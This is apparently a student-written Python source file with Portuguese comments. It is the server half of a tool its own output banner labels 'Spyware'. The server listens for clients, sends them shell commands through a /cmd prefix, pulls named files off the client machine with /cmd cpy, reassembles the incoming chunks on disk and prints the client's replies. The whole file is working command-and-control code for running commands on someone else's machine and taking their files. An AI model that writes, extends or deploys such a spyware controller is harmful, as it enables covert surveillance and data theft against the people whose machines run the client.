import socket
import selectors
import sys
import time

_HOST = 'localhost'
_PORT = 9995
_MAX_MSG_SIZE = 8192

# _PORT = int(sys.argv[1])

if __name__ == "__main__":
    sel = None
    soc = None
    key = None
    mask = None
    events = None
    addr = None
    conn = None
    resto = None
    ext = None 
    recv_files = [None, None]
    cores = {
        'limpa':'\033[m',
        'red':'\033[31m',
        'green':'\033[32m',
        'blue':'\033[34m'
    }

    # Iniciando o seletor como padrão
    sel = selectors.DefaultSelector()
    # Iniciando Socket
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((_HOST, _PORT))
    soc.listen(100)
    soc.setblocking(False)



    # Regsitrando nosso socket com o selector
    sel.register(soc, selectors.EVENT_READ)
    # Registrando o 'stdin' (usuário digitando) com o selector
    sel.register(sys.stdin.fileno(), selectors.EVENT_READ)

    print('{}Servidor Iniciado...{}'.format(cores['green'], cores['limpa']))

    #################################
    # Loop Principal
    #################################
    while True:
        try:
            events = sel.select()

            for key, mask in events:
                # Recebendo nova conexão
                if key.fileobj == soc:
                    conn, addr = soc.accept()
                    conn.setblocking(False)
                    sel.register(conn, selectors.EVENT_READ)
                    print('{}Nova conexão > {}{}'.format(cores['green'], key.fileobj, cores['limpa']))

                # Se o Usuario Digitou Algo
                elif key.fileobj == sys.stdin.fileno():
                    data = sys.stdin.readline() # Substitui o input (bloqueante)

                    if data[:4] == '/msg':
                        conn.send(('msg' + data[5:]).encode())

                    elif data[:5] == '/exit':
                        sel.unregister(conn)
                        conn.close()
                        ext = True
                        exit()
                        #ext = True
                        #a = (3 / 0)

                    elif data[:4] == '/cmd':
                        if data[5:8] == 'cpy':
                            conn.send(('cmdcpy' + data[9:]).encode())
                            name_arq = (data[9:len(data)-1])
                            print('{}Arquivo Selecionado > {}{}'.format(cores['blue'], cores['green'], name_arq, cores['limpa']))
                            # Abrindo arquivo com mesmo nome e guardando na posição 1
                            recv_files[0] = open(name_arq, 'wb')
                            recv_files[1] = None
                        else:
                            # Se for comandos "normais"
                            conn.send(('cmd' + data[5:]).encode())

                # Se não foi digitado nada, ele recebe as Respostas do cliente aqui
                else:
                    # Recebendo os Dados
                    data = key.fileobj.recv(_MAX_MSG_SIZE)

                    # Recuperando o código da mensagem
                    code = data[:3]
                    code = code.decode()

                    if code == 'FIL':
                        # Encontrando o tamanho do arquivo que será recebido
                        pos = 3
                        if recv_files[1] == None:
                            while True:
                                try:
                                    int(data[pos:pos+1].decode())
                                    pos = pos + 1
                                except:
                                    break

                            # Salvando o tamanho do arquivo que não foi recebido ainda
                            recv_files[1] = int(data[3:pos].decode())

                            # Cortando o pedaço da mensagem que já foi utilizado
                            data = data[pos:]

                            # Verificando se ainda sobraram dados para serem tratados
                            while len(data) > 0:
                                code = data[:3].decode()

                                # Verificação de sanidade, este código não deveria ser executado
                                if code != 'FIL':
                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['limpa']))

                                # Encontrando o tamanho do chunk
                                csize = int(data[3:6].decode())

                                # Verificando se temos o chunk inteiro na mensagem
                                if len(data[6:]) >= csize:
                                    # Temos o pedaço inteiro
                                    chunk = data[6:6 + csize]  # Separando o chunk
                                    data = data[6 + csize:]    # Atualizando a data
                                    recv_files[0].write(chunk) # Escrevendo no arquivo
                                else:
                                    # É necessário receber mais dados
                                    chunk = data[6:]
                                    data = key.fileobj.recv(csize - len(chunk))
                                    recv_files[0].write(chunk)
                                    recv_files[0].write(data)
                                    data = ''

                                # Atualizando dados já recebidos
                                recv_files[1] = recv_files[1] - csize

                            if recv_files[1] <= 0:
                                recv_files[0].close()
                                print('{}Arquivo recebido (em uma mensagem)!{}'.format(cores['green'], cores['limpa']))

                        else:
                            # else recv_files[1] != None
                            # Já recebemos o tamanho do arquivo e possívelmente alguns pedaços
                            csize = int(data[3:6].decode())

                            # Verificando se ainda sobraram dados para serem tratados
                            while len(data) > 0:
                                code = data[:3].decode()

                                # Verificação de sanidade, este código não deveria ser executado
                                if code != 'FIL':
                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['limpa']))

                                # Encontrando o tamanho do chunk
                                csize = int(data[3:6].decode())

                                # Verificando se temos o chunk inteiro na mensagem
                                if len(data[6:]) >= csize:
                                    # Temos o pedaço inteiro
                                    chunk = data[6:6 + csize]  # Separando o chunk
                                    data = data[6 + csize:]    # Atualizando a data
                                    recv_files[0].write(chunk) # Escrevendo no arquivo
                                else:
                                    # É necessário receber mais dados
                                    chunk = data[6:]
                                    data = key.fileobj.recv(csize - len(chunk))
                                    recv_files[0].write(chunk)
                                    recv_files[0].write(data)
                                    data = ''

                                # Atualizando dados já recebidos
                                recv_files[1] = recv_files[1] - csize

                            if recv_files[1] <= 0:
                                recv_files[0].close()
                                print('{}Arquivo recebido! (em várias mensagens){}'.format(cores['green'], cores['limpa']))

                    # Se não for arquivo, ele mostra a resposta do cliente
                    else:
                        if not data:
                            print('{}Cliente Desconectado > {}{}'.format(cores['red'], conn, cores['limpa']))
                            sel.unregister(conn)
                            conn.close()
                            break

                        print('\n'
                              '{}<<<===== Spyware (@) =====>>> {}\n'
                              '{}\n'.format(cores['blue'], cores['green'], data.decode(), cores['limpa']))
        except:

            if ext == True:
                exit()
                break
            # Isso não irá desconectar os clientes... eu acho...
            print('{}Error: Reiniciando Servidor!!!{}'.format(cores['red'], cores['limpa']))
            continue
